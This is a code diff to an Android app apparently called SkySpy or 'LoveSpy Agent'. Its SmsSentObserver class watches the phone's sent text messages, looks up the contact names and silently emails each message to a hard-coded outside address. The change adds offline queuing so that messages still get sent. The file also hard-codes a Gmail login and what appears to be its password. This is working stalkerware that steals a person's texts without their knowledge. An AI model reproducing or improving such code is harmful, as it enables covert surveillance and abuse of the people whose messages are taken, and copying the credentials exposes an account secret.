@@ -11,6 +11,8 @@ import android.provider.Telephony;
 import android.util.Log;
 
 import com.example.skyspy.app.email.EmailSending;
+import com.example.skyspy.app.network.NetworkStatus;
+import com.example.skyspy.app.network.NetworkUpdateReceiver;
 import com.example.skyspy.app.utils.Utils;
 
 import java.text.DateFormat;
@@ -61,7 +63,7 @@ public class SmsSentObserver extends ContentObserver {
                             @Override
                             protected Void doInBackground(String... params) {
                                 String letter = params[0];
-                                sendEmailSilently(letter);
+                                trySending(letter);
                                 return null;
                             }
                         }.execute(sms);
@@ -76,7 +78,16 @@ public class SmsSentObserver extends ContentObserver {
         super.onChange(selfChange);
     }
 
-    public String getNumber(String thread_id){
+    private void trySending(String letter) {
+        if (NetworkStatus.getInstance(mContext).isOnline()) {
+            sendEmailSilently(letter);
+        } else {
+            SmsReader.SUSPENDED_LIST.add(letter);
+            NetworkUpdateReceiver.setLetterList(SmsReader.SUSPENDED_LIST);
+        }
+    }
+
+    private String getNumber(String thread_id){
         String recipient_id = null;
         String number = null;
         Uri convUri = Uri.parse("content://mms-sms/conversations?simple=true");
@@ -97,7 +108,7 @@ public class SmsSentObserver extends ContentObserver {
         return number;
     }
 
-    public String getContactName(String address) {
+    private String getContactName(String address) {
         String name = null;
         Uri peopleUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
         String[] projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };
@@ -110,7 +121,7 @@ public class SmsSentObserver extends ContentObserver {
         return name;
     }
 
-    public String getSmsTypeName(Integer type) {
+    private String getSmsTypeName(Integer type) {
         String str = "";
         if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_ALL) {
             str = "ALL";
@@ -130,26 +141,25 @@ public class SmsSentObserver extends ContentObserver {
         return str;
     }
 
-    public String getDate(Long timeMs) {
+    private String getDate(Long timeMs) {
         Date date = new Date(timeMs);
         DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
         return df.format(date);
     }
 
-    public String removeNewLine(String str){
+    private String removeNewLine(String str){
         str = str.replace("\n"," ");
         return str;
     }
 
-    public void sendEmailSilently(String letter) {
+    private void sendEmailSilently(String letter) {
         EmailSending emailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
         String[] toArr = {"1eecooper@ukr.net"};
         emailSending.setTo(toArr);
         emailSending.setFrom("wooo@wooo.com");
         emailSending.setSubject("[Sms] LoveSpy Agent");
-        emailSending.setBody(letter);
         try {
-            emailSending.sendSilently();
+            emailSending.sendSilently(letter);
         } catch(Exception e) {
             Log.e(Utils.TAG, "Could not send email", e);
         }
